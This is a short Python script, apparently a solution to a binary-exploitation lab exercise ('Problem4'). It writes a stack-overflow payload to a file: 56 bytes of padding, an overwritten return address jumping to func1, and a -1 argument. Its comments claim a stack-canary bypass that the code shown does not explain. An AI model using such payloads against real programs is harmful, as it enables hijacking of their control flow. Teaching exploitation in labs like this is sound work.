# payload4.py - Problem4 绕过Canary+栈溢出攻击
# 1. 56字节padding：覆盖缓冲区+Canary+冗余栈空间，精准到返回地址
padding = b"A" * 56

# 2. 跳转地址：func1（0x131c），小端序
func1_addr = b"\x1c\x13\x00\x00\x00\x00\x00\x00"

# 3. 触发参数：-1（0xffffffff），压入栈中供func校验
trigger_param = b"\xff\xff\xff\xff\x00\x00\x00\x00"

# 4. 拼接完整Payload（绕过Canary+直接跳转到func1）
payload = padding + func1_addr + trigger_param

# 5. 写入文件
with open("ans4.txt", "wb") as f:
    f.write(payload)

print("✅ Problem4 Payload生成成功！")
print(f"📏 Payload长度：{len(payload)} 字节")